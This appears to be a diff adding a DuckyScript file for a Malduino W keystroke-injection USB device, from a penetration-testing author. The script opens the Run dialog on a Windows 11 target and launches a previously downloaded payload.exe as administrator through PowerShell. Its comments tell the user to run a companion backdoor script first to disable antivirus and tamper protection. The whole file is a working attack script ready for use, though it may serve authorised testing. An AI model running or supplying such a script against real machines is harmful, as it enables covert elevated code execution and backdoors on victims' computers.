@@ -1,0 +1,21 @@
+REM -----------------------------------------------------------------------------------------
+REM   Run the payload on the target.  (Win 11 22H2)
+REM   Pentestit.de - Frank Neugebauer (06.01.2023)
+REM   Tested with Lenovo Thinkpad T440 (German Keyboard) and
+REM   Malduino W from Maltronics
+REM   https://docs.maltronics.com/devices/malduino-w
+REM   Use backdoor.txt to disable Virus and Tamper Protection first!
+REM   Use cleanup.txt to clean everthing up and start Virus Protection.
+REM   Currently supported layouts: DE, GB, US, ES, FR, DK, RU
+REM   ---------------------------------------------------------------------------------------
+REM LED off
+LED 0 0 0
+LOCALE DE
+DEFAULTDELAY 1000
+Gui r
+REM Run Payload as Administrator
+REM Use the Payload you have downloaded with backdoor.txt!
+STRING powershell Start-Process c:\payloads\payload.exe -Verb runAS
+ENTER
+REM LED green
+LED 0 255 0
